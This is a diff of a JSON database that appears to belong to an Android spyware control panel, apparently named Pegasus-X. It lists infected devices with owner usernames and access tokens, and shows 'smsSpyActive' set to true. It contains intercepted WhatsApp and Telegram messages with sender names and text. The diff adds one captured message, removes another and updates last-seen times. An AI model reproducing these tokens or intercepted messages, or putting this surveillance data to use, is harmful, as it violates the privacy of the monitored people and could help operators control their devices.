@@ -3031,7 +3031,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "cf99cabf9358fc617b7c22cc76eb4cb3",
-    "lastSeen": 1776752197459,
+    "lastSeen": 1776752217074,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-20T19:20:24.863Z",
@@ -3072,7 +3072,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "3b9b91fe42c928810228c2889719201c",
-    "lastSeen": 1776752197677,
+    "lastSeen": 1776752213938,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T04:18:12.057Z",
@@ -3094,6 +3094,14 @@
     },
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "All Buyer Pegasus-X ( No Update ): Membalas Anda",
+        "content": "~ 2️⃣0️⃣1️⃣3️⃣: nanti bisa kembali seperti semula ga?",
+        "time": "21/04 13:16",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776752217732
+      },
       {
         "appName": "WhatsApp",
         "sender": "Bobs",
@@ -7085,14 +7093,6 @@
         "time": "21/04 11:38",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776746311382
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16220 pesan baru dari 110 obrolan",
-        "time": "21/04 11:38",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776746311336
       }
     ],
     "galleryPhotos": [
